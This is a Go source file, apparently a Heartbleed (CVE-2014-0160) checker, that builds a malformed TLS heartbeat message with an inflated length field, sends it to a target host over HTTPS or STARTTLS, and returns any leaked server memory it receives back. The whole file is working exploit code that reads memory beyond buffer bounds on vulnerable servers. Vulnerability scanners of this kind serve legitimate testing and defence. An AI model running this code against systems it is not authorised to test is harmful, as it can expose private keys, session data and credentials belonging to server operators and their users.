package heartbleed

import (
	"bytes"
	"encoding/binary"
	"errors"
	"github.com/FiloSottile/Heartbleed/tls"
	"github.com/davecgh/go-spew/spew"
	"net"
	"strings"
	"time"
)

type Target struct {
	HostIp  string
	Service string
}

var Safe = errors.New("heartbleed: no response or payload not found")
var Timeout = errors.New("heartbleed: timeout")

var padding = []byte(" YELLOW SUBMARINE ")

// struct {
//    uint8  type;
//    uint16 payload_length;
//    opaque payload[HeartbeatMessage.payload_length];
//    opaque padding[padding_length];
// } HeartbeatMessage;
func buildEvilMessage(payload []byte, host string) []byte {
	buf := bytes.Buffer{}
	err := binary.Write(&buf, binary.BigEndian, uint8(1))
	if err != nil {
		panic(err)
	}
	err = binary.Write(&buf, binary.BigEndian, uint16(len(payload)+40+len(host)))
	if err != nil {
		panic(err)
	}
	_, err = buf.Write(payload)
	if err != nil {
		panic(err)
	}
	_, err = buf.Write(padding)
	if err != nil {
		panic(err)
	}
	_, err = buf.WriteString(host)
	if err != nil {
		panic(err)
	}
	return buf.Bytes()
}

func Heartbleed(tgt *Target, payload []byte, skipVerify bool) (out []byte, err error) {
	host := tgt.HostIp

	if strings.Index(host, ":") == -1 {
		host = host + ":443"
	}
	net_conn, err := net.DialTimeout("tcp", host, 3*time.Second)
	if err != nil {
		return
	}
	net_conn.SetDeadline(time.Now().Add(9 * time.Second))

	if tgt.Service != "https" {
		err = DoStartTLS(net_conn, tgt.Service)
		if err != nil {
			return
		}
	}

	hname := strings.Split(host, ":")
	conn := tls.Client(net_conn, &tls.Config{InsecureSkipVerify: skipVerify, ServerName: hname[0]})
	err = conn.Handshake()
	if err != nil {
		return
	}

	var vuln = make(chan bool, 1)
	buf := new(bytes.Buffer)
	err = conn.SendHeartbeat([]byte(buildEvilMessage(payload, host)), func(data []byte) {
		spew.Fdump(buf, data)
		if bytes.Index(data, padding) == -1 {
			vuln <- false
		} else {
			if strings.Index(string(data), host) == -1 {
				err = errors.New("Please try again")
				vuln <- false
			} else {
				vuln <- true
			}
		}
	})
	if err != nil {
		return
	}

	go func() {
		// Needed to process the incoming heartbeat
		conn.Read(nil)
		// spew.Dump(read_err)
	}()

	go func() {
		time.Sleep(3 * time.Second)
		_, err = conn.Write([]byte("quit\n"))
		conn.Read(nil) // TODO: here we should probably check that it succeeds
		vuln <- false
	}()

	select {
	case status := <-vuln:
		conn.Close()
		if status {
			out = buf.Bytes()
			return out, nil // VULNERABLE
		} else if err != nil {
			return
		} else {
			err = Safe
			return
		}
	case <-time.After(6 * time.Second):
		err = Timeout
		conn.Close()
		return
	}

}
